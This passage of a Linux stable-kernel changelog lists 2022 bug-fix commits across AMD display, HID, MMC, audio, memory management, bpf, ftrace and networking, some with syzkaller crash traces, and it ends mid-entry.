Signed-off-by: Kenneth Feng
Reviewed-by: Feifei Xu
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit 909dae582c8f3a9a231c7bc41594787b1620a5f1
Author: Meenakshikumar Somasundaram
Date: Mon Jul 11 18:37:41 2022 -0400
drm/amd/display: Fix TDR eDP and USB4 display light up issue
[ Upstream commit 30456ffa65469d1d2e5e1da05017e6728d24c11c ]
[Why]
After TDR recovery, eDP and USB4 display does not light up. Because
dmub outbox notifications are not enabled after dmub reload and link
encoder assignments for the streams are not cleared before dc state
reset.
[How]
- Dmub outbox notification is enabled after tdr recovery by issuing
inbox command to dmub.
- Link encoders for the streams are unassigned before dc state reset.
Reviewed-by: Jimmy Kizito
Reviewed-by: Jun Lei
Acked-by: Tom Chung
Signed-off-by: Meenakshikumar Somasundaram
Tested-by: Daniel Wheeler
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit 3101839b080137c367f3f88c2a040f791de880aa
Author: Fudong Wang
Date: Wed Jul 27 12:01:29 2022 +0800
drm/amd/display: clear optc underflow before turn off odm clock
[ Upstream commit b2a93490201300a749ad261b5c5d05cb50179c44 ]
[Why]
After ODM clock off, optc underflow bit will be kept there always and clear not work.
We need to clear that before clock off.
[How]
Clear that if have when clock off.
Reviewed-by: Alvin Lee
Acked-by: Tom Chung
Signed-off-by: Fudong Wang
Tested-by: Daniel Wheeler
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit c6f7ba837efc8f12c51aecaf9570d86adb80ab90
Author: Alvin Lee
Date: Thu Jul 28 09:51:05 2022 -0400
drm/amd/display: For stereo keep "FLIP\_ANY\_FRAME"
[ Upstream commit 84ef99c728079dfd21d6bc70b4c3e4af20602b3c ]
[Description]
Observed in stereomode that programming FLIP\_LEFT\_EYE
can cause hangs. Keep FLIP\_ANY\_FRAME in stereo mode so
the surface flip can take place before left or right eye
Reviewed-by: Martin Leung
Acked-by: Tom Chung
Signed-off-by: Alvin Lee
Tested-by: Daniel Wheeler
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit 71f2cb739a3cbcda4612889ce660fd8c380e3e1d
Author: Leo Ma
Date: Fri Jul 22 13:42:58 2022 -0400
drm/amd/display: Fix HDMI VSIF V3 incorrect issue
[ Upstream commit 0591183699fceeafb4c4141072d47775de83ecfb ]
[Why]
Reported from customer the checksum in AMD VSIF V3 is incorrect and
causing blank screen issue.
[How]
Fix the packet length issue on AMD HDMI VSIF V3.
Reviewed-by: Anthony Koo
Acked-by: Tom Chung
Signed-off-by: Leo Ma
Tested-by: Daniel Wheeler
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit b26218b2349ac2b2141fd07430ded3786bee6910
Author: Josip Pavic
Date: Thu Jul 21 15:33:00 2022 -0400
drm/amd/display: Avoid MPC infinite loop
[ Upstream commit 8de297dc046c180651c0500f8611663ae1c3828a ]
[why]
In some cases MPC tree bottom pipe ends up point to itself. This causes
iterating from top to bottom to hang the system in an infinite loop.
[how]
When looping to next MPC bottom pipe, check that the pointer is not same
as current to avoid infinite loop.
Reviewed-by: Josip Pavic
Reviewed-by: Jun Lei
Acked-by: Alex Hung
Signed-off-by: Aric Cyr
Tested-by: Daniel Wheeler
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit ab01ac7fa985755e29663283ec13179e99bf8fcf
Author: Chiawen Huang
Date: Thu Jul 21 21:57:05 2022 +0800
drm/amd/display: Device flash garbage before get in OS
[ Upstream commit 9c580e8f6cd6524d4e2c3490c440110526f7ddd6 ]
[Why]
Enabling stream with tg lock makes config settings
pending causing the garbage until tg unlock.
[How]
Keep the original lock mechanism
The driver doesn't lock tg if plane\_state is null.
Reviewed-by: Anthony Koo
Acked-by: Tom Chung
Signed-off-by: Chiawen Huang
Tested-by: Daniel Wheeler
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit ae29c0c466812726347813ab44bc144f0b4644b6
Author: Aurabindo Pillai
Date: Fri Jul 29 13:36:31 2022 -0400
drm/amd/display: Add a missing register field for HPO DP stream encoder
[ Upstream commit 37bc31f0e7da4fbad4664e64d906ae7b9009e550 ]
[Why&How]
Add the missing definition to set the register field
HBLANK\_MINIMUM\_SYMBOL\_WIDTH
Signed-off-by: Aurabindo Pillai
Acked-by: Alex Deucher
Signed-off-by: Alex Deucher
Signed-off-by: Sasha Levin
commit de3f7eb0b8642ded71fae5bbf4db584933da6c7d
Author: Alexandre Vicenzi
Date: Mon Aug 8 20:03:43 2022 +0200
rtla: Fix tracer name
[ Upstream commit f1432cd24c240cedf78c0d026631e3b10052c8e1 ]
The correct tracer name is timerlat and not timelat.
Link: https://lore.kernel.org/linux-trace-devel/20220808180343.22262-1-alexandre.vicenzi@suse.com
Signed-off-by: Alexandre Vicenzi
Signed-off-by: Steven Rostedt (Google)
Signed-off-by: Sasha Levin
commit 33f15a70fe9d26554d6b8f306f088a5e3ae31e49
Author: Oder Chiou
Date: Mon Aug 8 13:28:36 2022 +0800
ASoC: rt5640: Fix the JD voltage dropping issue
[ Upstream commit afb176d45870048eea540991b082208270824037 ]
The patch fixes the JD voltage dropping issue in the HDA JD using.
Signed-off-by: Oder Chiou
Reported-by: Mohan Kumar D
Link: https://lore.kernel.org/r/20220808052836.25791-1-oder\_chiou@realtek.com
Signed-off-by: Mark Brown
Signed-off-by: Sasha Levin
commit dc4351487a55899ad73a286391c1b58604754956
Author: Biju Das
Date: Thu Jul 28 10:26:12 2022 +0100
ASoC: sh: rz-ssi: Improve error handling in rz\_ssi\_probe() error path
[ Upstream commit c75ed9f54ce8d349fee557f2b471a4d637ed2a6b ]
We usually do cleanup in reverse order of init. Currently in case of
error rz\_ssi\_release\_dma\_channels() done in the reverse order. This
patch improves error handling in rz\_ssi\_probe() error path.
While at it, use "goto cleanup" style to reduce code duplication.
Reported-by: Pavel Machek
Signed-off-by: Biju Das
Link: https://lore.kernel.org/r/20220728092612.38858-1-biju.das.jz@bp.renesas.com
Signed-off-by: Mark Brown
Signed-off-by: Sasha Levin
commit d875be57a21586f2ebdacb04afa134932b4d4d91
Author: Konstantin Komarov
Date: Fri May 13 19:54:23 2022 +0300
fs/ntfs3: Fix work with fragmented xattr
[ Upstream commit 42f86b1226a42bfc79a7125af435432ad4680a32 ]
In some cases xattr is too fragmented,
so we need to load it before writing.
Signed-off-by: Konstantin Komarov
Signed-off-by: Sasha Levin
commit c9215e9018bd17ac5b4dfb1a032268e27f45a819
Author: Liming Sun
Date: Tue Aug 9 13:37:42 2022 -0400
mmc: sdhci-of-dwcmshc: Re-enable support for the BlueField-3 SoC
[ Upstream commit a0753ef66c34c1739580219dca664eda648164b7 ]
The commit 08f3dff799d4 (mmc: sdhci-of-dwcmshc: add rockchip platform
support") introduces the use of\_device\_get\_match\_data() to check for some
chips. Unfortunately, it also breaks the BlueField-3 FW, which uses ACPI.
To fix the problem, let's add the ACPI match data and the corresponding
quirks to re-enable the support for the BlueField-3 SoC.
Reviewed-by: David Woods
Signed-off-by: Liming Sun
Acked-by: Adrian Hunter
Fixes: 08f3dff799d4 ("mmc: sdhci-of-dwcmshc: add rockchip platform support")
Cc: stable@vger.kernel.org
Link: https://lore.kernel.org/r/20220809173742.178440-1-limings@nvidia.com
[Ulf: Clarified the commit message a bit]
Signed-off-by: Ulf Hansson
Signed-off-by: Sasha Levin
commit 30841ba786ee2e55e05fa98a7c255b83313694f4
Author: Sebastian Reichel
Date: Wed May 4 23:32:40 2022 +0200
mmc: sdhci-of-dwcmshc: rename rk3568 to rk35xx
[ Upstream commit 86e1a8e1f9b555af342c53ae06284eeeab9a4263 ]
Prepare driver for rk3588 support by renaming the internal data
structures.
Acked-by: Adrian Hunter
Signed-off-by: Sebastian Reichel
Link: https://lore.kernel.org/r/20220504213251.264819-11-sebastian.reichel@collabora.com
Signed-off-by: Ulf Hansson
Signed-off-by: Sasha Levin
commit d1541cdf5aecb0b85c26624478b154cce920281b
Author: Yifeng Zhao
Date: Wed May 4 23:32:39 2022 +0200
mmc: sdhci-of-dwcmshc: add reset call back for rockchip Socs
[ Upstream commit 70f832206fe72e9998b46363e8e59e89b0b757bc ]
The reset function build in the SDHCI will not reset the logic
circuit related to the tuning function, which may cause data
reading errors. Resetting the complete SDHCI controller through
the reset controller fixes the issue.
Signed-off-by: Yifeng Zhao
[rebase, use optional variant of reset getter]
Acked-by: Adrian Hunter
Signed-off-by: Sebastian Reichel
Link: https://lore.kernel.org/r/20220504213251.264819-10-sebastian.reichel@collabora.com
Signed-off-by: Ulf Hansson
Signed-off-by: Sasha Levin
commit 1c137c46d16e33b71ef92daf1882d5443fa2ec93
Author: Wenbin Mei
Date: Thu Jul 28 16:00:48 2022 +0800
mmc: mtk-sd: Clear interrupts when cqe off/disable
[ Upstream commit cc5d1692600613e72f32af60e27330fe0c79f4fe ]
Currently we don't clear MSDC interrupts when cqe off/disable, which led
to the data complete interrupt will be reserved for the next command.
If the next command with data transfer after cqe off/disable, we process
the CMD ready interrupt and trigger DMA start for data, but the data
complete interrupt is already exists, then SW assume that the data transfer
is complete, SW will trigger DMA stop, but the data may not be transmitted
yet or is transmitting, so we may encounter the following error:
mtk-msdc 11230000.mmc: CMD bus busy detected.
Signed-off-by: Wenbin Mei
Fixes: 88bd652b3c74 ("mmc: mediatek: command queue support")
Cc: stable@vger.kernel.org
Link: https://lore.kernel.org/r/20220728080048.21336-1-wenbin.mei@mediatek.com
Signed-off-by: Ulf Hansson
Signed-off-by: Sasha Levin
commit 1d7df13d223b4bdf52ba51eec15d7161235bdde4
Author: Even Xu
Date: Tue Aug 23 09:10:59 2022 +0800
HID: intel-ish-hid: ipc: Add Meteor Lake PCI device ID
commit 467249a7dff68451868ca79696aef69764193a8a upstream.
Add device ID of Meteor Lake P into ishtp support list.
Signed-off-by: Even Xu
Acked-by: Srinivas Pandruvada
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit a32046896fe1ad944fd61aec3127485066c4eff4
Author: Michael Hübner
Date: Fri Aug 5 10:05:23 2022 +0200
HID: thrustmaster: Add sparco wheel and fix array length
commit d9a17651f3749e69890db57ca66e677dfee70829 upstream.
Add device id for the Sparco R383 Mod wheel.
Fix wheel info array length to match actual wheel count present in the array.
Signed-off-by: Michael Hübner
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit 7c6e6c334154be16740b44dcd7638fb510b9bd91
Author: Daniel J. Ogorchock
Date: Wed Jul 13 16:20:59 2022 -0400
HID: nintendo: fix rumble worker null pointer deref
commit 1ff89e06c2e5fab30274e4b02360d4241d6e605e upstream.
We can dereference a null pointer trying to queue work to a destroyed
workqueue.
If the device is disconnected, nintendo\_hid\_remove is called, in which
the rumble\_queue is destroyed. Avoid using that queue to defer rumble
work once the controller state is set to JOYCON\_CTLR\_STATE\_REMOVED.
This eliminates the null pointer dereference.
Signed-off-by: Daniel J. Ogorchock
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit 2b32e820ccf5a0385e46d1c038b321aba9a5ec2d
Author: Josh Kilmer
Date: Thu Jul 28 12:51:11 2022 -0500
HID: asus: ROG NKey: Ignore portion of 0x5a report
commit 1c0cc9d11c665020cbeb80e660fb8929164407f4 upstream.
On an Asus G513QY, of the 5 bytes in a 0x5a report, only the first byte
is a meaningful keycode. The other bytes are zeroed out or hold garbage
from the last packet sent to the keyboard.
This patch fixes up the report descriptor for this event so that the
general hid code will only process 1 byte for keycodes, avoiding
spurious key events and unmapped Asus vendor usagepage code warnings.
Signed-off-by: Josh Kilmer
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit 5b3063adff7da583e61b284beb3308f7588a4c8a
Author: Aditya Garg
Date: Sun Aug 21 08:04:45 2022 +0000
HID: Add Apple Touchbar on T2 Macs in hid\_have\_special\_driver list
commit 750ec977288d96e9a11424e3507ede097af732c4 upstream.
The touchbar on Apple T2 Macs has 2 modes, one that shows the function
keys and other that shows the media controls. The user can use the fn
key on his keyboard to switch between the 2 modes.
On Linux, if people were using an external keyboard or mouse, the
touchbar failed to change modes on pressing the fn key with the following
in dmesg :-
[ 10.661445] apple-ib-als 0003:05AC:8262.0001: : USB HID v1.01 Device [Apple Inc. Ambient Light Sensor] on usb-bce-vhci-3/input0
[ 11.830992] apple-ib-touchbar 0003:05AC:8302.0007: input: USB HID v1.01 Keyboard [Apple Inc. Touch Bar Display] on usb-bce-vhci-6/input0
[ 12.139407] apple-ib-touchbar 0003:05AC:8102.0008: : USB HID v1.01 Device [Apple Inc. Touch Bar Backlight] on usb-bce-vhci-7/input0
[ 12.211824] apple-ib-touchbar 0003:05AC:8102.0009: : USB HID v1.01 Device [Apple Inc. Touch Bar Backlight] on usb-bce-vhci-7/input1
[ 14.219759] apple-ib-touchbar 0003:05AC:8302.0007: tb: Failed to set touch bar mode to 2 (-110)
[ 24.395670] apple-ib-touchbar 0003:05AC:8302.0007: tb: Failed to set touch bar mode to 2 (-110)
[ 34.635791] apple-ib-touchbar 0003:05AC:8302.0007: tb: Failed to set touch bar mode to 2 (-110)
[ 269.579233] apple-ib-touchbar 0003:05AC:8302.0007: tb: Failed to set touch bar mode to 1 (-110)
Add the USB IDs of the touchbar found in T2 Macs to HID have special
driver list to fix the issue.
Signed-off-by: Aditya Garg
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit 2803225ac89bc761ade8673105db8a8d84335054
Author: Akihiko Odaki
Date: Tue Aug 16 19:21:20 2022 +0900
HID: AMD\_SFH: Add a DMI quirk entry for Chromebooks
commit adada3f4930ac084740ea340bd8e94028eba4f22 upstream.
Google Chromebooks use Chrome OS Embedded Controller Sensor Hub instead
of Sensor Hub Fusion and leaves MP2 uninitialized, which disables all
functionalities, even including the registers necessary for feature
detections.
The behavior was observed with Lenovo ThinkPad C13 Yoga.
Signed-off-by: Akihiko Odaki
Suggested-by: Mario Limonciello
Acked-by: Basavaraj Natikar
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit 4af0f12367b2cdf687e58044a71916edb60b0f4d
Author: Steev Klimaszewski
Date: Thu Aug 18 21:39:24 2022 -0500
HID: add Lenovo Yoga C630 battery quirk
commit 3a47fa7b14c7d9613909a844aba27f99d3c58634 upstream.
Similar to the Surface Go devices, the Elantech touchscreen/digitizer in
the Lenovo Yoga C630 mistakenly reports the battery of the stylus, and
always reports an empty battery.
Apply the HID\_BATTERY\_QUIRK\_IGNORE quirk to ignore this battery and
prevent the erroneous low battery warnings.
Signed-off-by: Steev Klimaszewski
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit b61400c4e784065c9783442e8ef096fefa811901
Author: Benjamin Tissoires
Date: Mon Aug 22 08:22:47 2022 +0200
HID: input: fix uclogic tablets
commit 8db8be9cfc89935c97d791c7e6264e710a7e8a56 upstream.
commit 87562fcd1342 ("HID: input: remove the need for HID\_QUIRK\_INVERT")
made the assumption that it was the only one handling tablets and thus
kept an internal state regarding the tool.
Turns out that the uclogic driver has a timer to release the in range
bit, effectively making hid-input ignoring all in range information
after the very first one.
Fix that by having a more rationale approach which consists in forwarding
every event and let the input stack filter out the duplicates.
Reported-by: Stefan Hansson
Fixes: 87562fcd1342 ("HID: input: remove the need for HID\_QUIRK\_INVERT")
Signed-off-by: Benjamin Tissoires
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit ec45c77833192fa8da4681b1a4c6847fe7e4bf4c
Author: Takashi Iwai
Date: Sun Aug 28 09:41:43 2022 +0200
ALSA: usb-audio: Add quirk for LH Labs Geek Out HD Audio 1V5
commit 5f3d9e8161bb8cb23ab3b4678cd13f6e90a06186 upstream.
The USB DAC from LH Labs (2522:0007) seems requiring the same quirk as
Sony Walkman to set up the interface like UAC1; otherwise it gets the
constant errors "usb\_set\_interface failed (-71)". This patch adds a
quirk entry for addressing the buggy behavior.
Reported-by: Lennert Van Alboom
Cc:
Link: https://lore.kernel.org/r/T3VPXtCc4uFws9Gfh2RjX6OdwM1RqfC6VqQr--\_LMDyB2x5N3p9\_q6AtPna17IXhHwBtcJVdXuS80ZZSCMjh\_BafIbnzJPhbrkmhmWS6DlI=@vanalboom.org
Link: https://lore.kernel.org/r/20220828074143.14736-1-tiwai@suse.de
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 7877eaa1131147b4d6a063962f3aac0ab1b8ea1c
Author: Jann Horn
Date: Wed Aug 31 19:06:00 2022 +0200
mm/rmap: Fix anon\_vma->degree ambiguity leading to double-reuse
commit 2555283eb40df89945557273121e9393ef9b542b upstream.
anon\_vma->degree tracks the combined number of child anon\_vmas and VMAs
that use the anon\_vma as their ->anon\_vma.
anon\_vma\_clone() then assumes that for any anon\_vma attached to
src->anon\_vma\_chain other than src->anon\_vma, it is impossible for it to
be a leaf node of the VMA tree, meaning that for such VMAs ->degree is
elevated by 1 because of a child anon\_vma, meaning that if ->degree
equals 1 there are no VMAs that use the anon\_vma as their ->anon\_vma.
This assumption is wrong because the ->degree optimization leads to leaf
nodes being abandoned on anon\_vma\_clone() - an existing anon\_vma is
reused and no new parent-child relationship is created. So it is
possible to reuse an anon\_vma for one VMA while it is still tied to
another VMA.
This is an issue because is\_mergeable\_anon\_vma() and its callers assume
that if two VMAs have the same ->anon\_vma, the list of anon\_vmas
attached to the VMAs is guaranteed to be the same. When this assumption
is violated, vma\_merge() can merge pages into a VMA that is not attached
to the corresponding anon\_vma, leading to dangling page->mapping
pointers that will be dereferenced during rmap walks.
Fix it by separately tracking the number of child anon\_vmas and the
number of VMAs using the anon\_vma as their ->anon\_vma.
Fixes: 7a3ef208e662 ("mm: prevent endless growth of anon\_vma hierarchy")
Cc: stable@kernel.org
Acked-by: Michal Hocko
Acked-by: Vlastimil Babka
Signed-off-by: Jann Horn
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 72f2dc8993f10262092745a88cb2dd0fef094f23
Author: Zhengchao Shao
Date: Fri Jul 15 19:55:59 2022 +0800
bpf: Don't redirect packets with invalid pkt\_len
commit fd1894224407c484f652ad456e1ce423e89bb3eb upstream.
Syzbot found an issue [1]: fq\_codel\_drop() try to drop a flow whitout any
skbs, that is, the flow->head is null.
The root cause, as the [2] says, is because that bpf\_prog\_test\_run\_skb()
run a bpf prog which redirects empty skbs.
So we should determine whether the length of the packet modified by bpf
prog or others like bpf\_prog\_test is valid before forwarding it directly.
LINK: [1] https://syzkaller.appspot.com/bug?id=0b84da80c2917757915afa89f7738a9d16ec96c5
LINK: [2] https://www.spinics.net/lists/netdev/msg777503.html
Reported-by: syzbot+7a12909485b94426aceb@syzkaller.appspotmail.com
Signed-off-by: Zhengchao Shao
Reviewed-by: Stanislav Fomichev
Link: https://lore.kernel.org/r/20220715115559.139691-1-shaozhengchao@huawei.com
Signed-off-by: Alexei Starovoitov
Signed-off-by: Greg Kroah-Hartman
commit d81bd6671f45fde4c3ac7fd7733c6e3082ae9d8e
Author: Yang Jihong
Date: Thu Aug 18 11:26:59 2022 +0800
ftrace: Fix NULL pointer dereference in is\_ftrace\_trampoline when ftrace is dead
commit c3b0f72e805f0801f05fa2aa52011c4bfc694c44 upstream.
ftrace\_startup does not remove ops from ftrace\_ops\_list when
ftrace\_startup\_enable fails:
register\_ftrace\_function
ftrace\_startup
\_\_register\_ftrace\_function
...
add\_ftrace\_ops(&ftrace\_ops\_list, ops)
...
...
ftrace\_startup\_enable // if ftrace failed to modify, ftrace\_disabled is set to 1
...
return 0 // ops is in the ftrace\_ops\_list.
When ftrace\_disabled = 1, unregister\_ftrace\_function simply returns without doing anything:
unregister\_ftrace\_function
ftrace\_shutdown
if (unlikely(ftrace\_disabled))
return -ENODEV; // return here, \_\_unregister\_ftrace\_function is not executed,
// as a result, ops is still in the ftrace\_ops\_list
\_\_unregister\_ftrace\_function
...
If ops is dynamically allocated, it will be free later, in this case,
is\_ftrace\_trampoline accesses NULL pointer:
is\_ftrace\_trampoline
ftrace\_ops\_trampoline
do\_for\_each\_ftrace\_op(op, ftrace\_ops\_list) // OOPS! op may be NULL!
Syzkaller reports as follows:
[ 1203.506103] BUG: kernel NULL pointer dereference, address: 000000000000010b
[ 1203.508039] #PF: supervisor read access in kernel mode
[ 1203.508798] #PF: error\_code(0x0000) - not-present page
[ 1203.509558] PGD 800000011660b067 P4D 800000011660b067 PUD 130fb8067 PMD 0
[ 1203.510560] Oops: 0000 [#1] SMP KASAN PTI
[ 1203.511189] CPU: 6 PID: 29532 Comm: syz-executor.2 Tainted: G B W 5.10.0 #8
[ 1203.512324] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.14.0-0-g155821a1990b-prebuilt.qemu.org 04/01/2014
[ 1203.513895] RIP: 0010:is\_ftrace\_trampoline+0x26/0xb0
[ 1203.514644] Code: ff eb d3 90 41 55 41 54 49 89 fc 55 53 e8 f2 00 fd ff 48 8b 1d 3b 35 5d 03 e8 e6 00 fd ff 48 8d bb 90 00 00 00 e8 2a 81 26 00 <48> 8b ab 90 00 00 00 48 85 ed 74 1d e8 c9 00 fd ff 48 8d bb 98 00
[ 1203.518838] RSP: 0018:ffffc900012cf960 EFLAGS: 00010246
[ 1203.520092] RAX: 0000000000000000 RBX: 000000000000007b RCX: ffffffff8a331866
[ 1203.521469] RDX: 0000000000000000 RSI: 0000000000000008 RDI: 000000000000010b
[ 1203.522583] RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff8df18b07
[ 1203.523550] R10: fffffbfff1be3160 R11: 0000000000000001 R12: 0000000000478399
[ 1203.524596] R13: 0000000000000000 R14: ffff888145088000 R15: 0000000000000008
[ 1203.525634] FS: 00007f429f5f4700(0000) GS:ffff8881daf00000(0000) knlGS:0000000000000000
[ 1203.526801] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1203.527626] CR2: 000000000000010b CR3: 0000000170e1e001 CR4: 00000000003706e0
[ 1203.528611] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 1203.529605] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Therefore, when ftrace\_startup\_enable fails, we need to rollback registration
process and remove ops from ftrace\_ops\_list.
Link: https://lkml.kernel.org/r/20220818032659.56209-1-yangjihong1@huawei.com
Suggested-by: Steven Rostedt
Signed-off-by: Yang Jihong
Signed-off-by: Steven Rostedt (Google)
Signed-off-by: Greg Kroah-Hartman
commit cb4bb011a683532841344ca7f281b5e04389b4f8
Author: Letu Ren
Date: Thu Aug 18 18:44:24 2022 +0800
fbdev: fb\_pm2fb: Avoid potential divide by zero error
commit 19f953e7435644b81332dd632ba1b2d80b1e37af upstream.
In `do\_fb\_ioctl()` of fbmem.c, if cmd is FBIOPUT\_VSCREENINFO, var will be
copied from user, then go through `fb\_set\_var()` and
`info->fbops->fb\_check\_var()` which could may be `pm2fb\_check\_var()`.
Along the path, `var->pixclock` won't be modified. This function checks
whether reciprocal of `var->pixclock` is too high. If `var->pixclock` is
zero, there will be a divide by zero error. So, it is necessary to check
whether denominator is zero to avoid crash. As this bug is found by
Syzkaller, logs are listed below.
divide error in pm2fb\_check\_var
Call Trace:
fb\_set\_var+0x367/0xeb0 drivers/video/fbdev/core/fbmem.c:1015
do\_fb\_ioctl+0x234/0x670 drivers/video/fbdev/core/fbmem.c:1110
fb\_ioctl+0xdd/0x130 drivers/video/fbdev/core/fbmem.c:1189
Reported-by: Zheyu Ma
Signed-off-by: Letu Ren
Signed-off-by: Helge Deller
Signed-off-by: Greg Kroah-Hartman
commit 86026be8535c16fcc5e4f960286faf04d7f77815
Author: Hawkins Jiawei
Date: Fri Aug 5 15:48:34 2022 +0800
net: fix refcount bug in sk\_psock\_get (2)
commit 2a0133723f9ebeb751cfce19f74ec07e108bef1f upstream.
Syzkaller reports refcount bug as follows:
------------[ cut here ]------------
refcount\_t: saturated; leaking memory.
WARNING: CPU: 1 PID: 3605 at lib/refcount.c:19 refcount\_warn\_saturate+0xf4/0x1e0 lib/refcount.c:19
Modules linked in:
CPU: 1 PID: 3605 Comm: syz-executor208 Not tainted 5.18.0-syzkaller-03023-g7e062cda7d90 #0
\_\_refcount\_add\_not\_zero include/linux/refcount.h:163 [inline]
\_\_refcount\_inc\_not\_zero include/linux/refcount.h:227 [inline]
refcount\_inc\_not\_zero include/linux/refcount.h:245 [inline]
sk\_psock\_get+0x3bc/0x410 include/linux/skmsg.h:439
tls\_data\_ready+0x6d/0x1b0 net/tls/tls\_sw.c:2091
tcp\_data\_ready+0x106/0x520 net/ipv4/tcp\_input.c:4983
tcp\_data\_queue+0x25f2/0x4c90 net/ipv4/tcp\_input.c:5057
tcp\_rcv\_state\_process+0x1774/0x4e80 net/ipv4/tcp\_input.c:6659
tcp\_v4\_do\_rcv+0x339/0x980 net/ipv4/tcp\_ipv4.c:1682
sk\_backlog\_rcv include/net/sock.h:1061 [inline]
\_\_release\_sock+0x134/0x3b0 net/core/sock.c:2849
release\_sock+0x54/0x1b0 net/core/sock.c:3404
inet\_shutdown+0x1e0/0x430 net/ipv4/af\_inet.c:909
\_\_sys\_shutdown\_sock net/socket.c:2331 [inline]
\_\_sys\_shutdown\_sock net/socket.c:2325 [inline]
\_\_sys\_shutdown+0xf1/0x1b0 net/socket.c:2343
\_\_do\_sys\_shutdown net/socket.c:2351 [inline]
\_\_se\_sys\_shutdown net/socket.c:2349 [inline]
\_\_x64\_sys\_shutdown+0x50/0x70 net/socket.c:2349
do\_syscall\_x64 arch/x86/entry/common.c:50 [inline]
do\_syscall\_64+0x35/0xb0 arch/x86/entry/common.c:80
entry\_SYSCALL\_64\_after\_hwframe+0x46/0xb0

During SMC fallback process in connect syscall, kernel will
replaces TCP with SMC. In order to forward wakeup
smc socket waitqueue after fallback, kernel will sets
clcsk->sk\_user\_data to origin smc socket in
smc\_fback\_replace\_callbacks().
Later, in shutdown syscall, kernel will calls
sk\_psock\_get(), which treats the clcsk->sk\_user\_data
as psock type, triggering the refcnt warning.
So, the root cause is that smc and psock, both will use
sk\_user\_data field. So they will mismatch this field
easily.
This patch solves it by using another bit(defined as
SK\_USER\_DATA\_PSOCK) in PTRMASK, to mark whether
sk\_user\_data points to a psock object or not.
This patch depends on a PTRMASK introduced in commit f1ff5ce2cd5e
("net, sk\_msg: Clear sk\_user\_data pointer on clone if tagged").
For there will possibly be more flags in the sk\_user\_data field,
this patch also refactor sk\_user\_data flags code to be more generic
to improve its maintainability.
Reported-and-tested-by: syzbot+5f26f85569bd179c18ce@syzkaller.appspotmail.com
Suggested-by: Jakub Kicinski
Acked-by: Wen Gu
Signed-off-by: Hawkins Jiawei
Reviewed-by: Jakub Sitnicki
Signed-off-by: Jakub Kicinski
Signed-off-by: Greg Kroah-Hartman
commit 52a3c62a815161c2dcf38ac421f6c41d8679462b
Author: Karthik Alapati
Date: Thu Jul 28 21:13:17 2022 +0530
HID: hidraw: fix memory leak in hidraw\_release()
commit a5623a203cffe2d2b84d2f6c989d9017db1856af upstream.
Free the buffered reports before deleting the list entry.
BUG: memory leak
unreferenced object 0xffff88810e72f180 (size 32):
comm "softirq", pid 0, jiffies 4294945143 (age 16.080s)
hex dump (first 32 bytes):
64 f3 c6 6a d1 88 07 04 00 00 00 00 00 00 00 00 d..j............
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
backtrace:
[] kmemdup+0x23/0x50 mm/util.c:128
[] kmemdup include/linux/fortify-string.h:440 [inline]
[] hidraw\_report\_event+0xa2/0x150 drivers/hid/hidraw.c:521
[] hid\_report\_raw\_event+0x27d/0x740 drivers/hid/hid-core.c:1992
[] hid\_input\_report+0x1ae/0x270 drivers/hid/hid-core.c:2065
[] hid\_irq\_in+0x1ff/0x250 drivers/hid/usbhid/hid-core.c:284
[] \_\_usb\_hcd\_giveback\_urb+0xf9/0x230 drivers/usb/core/hcd.c:1670
[] usb\_hcd\_giveback\_urb+0x1b6/0x1d0 drivers/usb/core/hcd.c:1747
[] dummy\_timer+0x8e4/0x14c0 drivers/usb/gadget/udc/dummy\_hcd.c:1988
[] call\_timer\_fn+0x38/0x200 kernel/time/timer.c:1474
[] expire\_timers kernel/time/timer.c:1519 [inline]
[] \_\_run\_timers.part.0+0x316/0x430 kernel/time/timer.c:1790
[] \_\_run\_timers kernel/time/timer.c:1768 [inline]
[] run\_timer\_softirq+0x44/0x90 kernel/time/timer.c:1803
[] \_\_do\_softirq+0xe6/0x2ea kernel/softirq.c:571
[] invoke\_softirq kernel/softirq.c:445 [inline]
[] \_\_irq\_exit\_rcu kernel/softirq.c:650 [inline]
[] irq\_exit\_rcu+0xc0/0x110 kernel/softirq.c:662
[] sysvec\_apic\_timer\_interrupt+0xa2/0xd0 arch/x86/kernel/apic/apic.c:1106
[] asm\_sysvec\_apic\_timer\_interrupt+0x1b/0x20 arch/x86/include/asm/idtentry.h:649
[] native\_safe\_halt arch/x86/include/asm/irqflags.h:51 [inline]
[] arch\_safe\_halt arch/x86/include/asm/irqflags.h:89 [inline]
[] acpi\_safe\_halt drivers/acpi/processor\_idle.c:111 [inline]
[] acpi\_idle\_do\_entry+0xc0/0xd0 drivers/acpi/processor\_idle.c:554
Link: https://syzkaller.appspot.com/bug?id=19a04b43c75ed1092021010419b5e560a8172c4f
Reported-by: syzbot+f59100a0428e6ded9443@syzkaller.appspotmail.com
Signed-off-by: Karthik Alapati
Signed-off-by: Jiri Kosina
Signed-off-by: Greg Kroah-Hartman
commit f44b0b95d50fffeca036e1ba36770390e0b519dd
Author: Alan Stern
Date: Thu Jul 21 11:07:10 2022 -0400
USB: gadget: Fix use-after-free Read in usb\_udc\_uevent()
